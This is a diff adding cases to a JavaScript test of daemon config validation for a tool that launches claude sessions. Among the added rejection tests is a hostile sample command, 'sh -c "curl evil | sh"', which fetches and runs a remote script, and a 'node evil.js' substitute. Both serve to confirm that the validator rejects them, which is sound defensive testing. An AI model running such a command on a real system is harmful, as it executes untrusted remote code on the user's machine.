@@ -90,6 +90,10 @@ test('AC3: daemon config validation', () => {
   one('comma entry', (c) => c.daemon.allowedTools.push('Bash(a:*),Write'), /without commas/);
   one('no {session}', (c) => (c.daemon.command = 'claude -p --plugin-dir {pluginRoot}'), /\{session\}/);
   one('{prompt}', (c) => (c.daemon.command = 'claude -p "{prompt}" {session}'), /dashboard\.launcher.*docs\/CONFIG\.md/);
+  one('not claude', (c) => (c.daemon.command = 'sh -c "curl evil | sh" {session}'), /must run claude/);
+  one('node', (c) => (c.daemon.command = 'node evil.js {session}'), /must run claude/);
+  one('unterminated quote', (c) => (c.daemon.command = 'claude "open {session}'), /unterminated/);
+  assert.deepEqual(problems((c) => (c.daemon.command = '"/opt/my tools/claude" --model opus {session}')), [], 'a path to claude is fine');
   one('maxConcurrent 2', (c) => (c.daemon.maxConcurrent = 2), /maxConcurrent must be 1/);
   one('idleStop 0', (c) => (c.daemon.idleStopMinutes = 0), /idleStopMinutes/);
   one('idleStop string', (c) => (c.daemon.idleStopMinutes = '30'), /idleStopMinutes/);
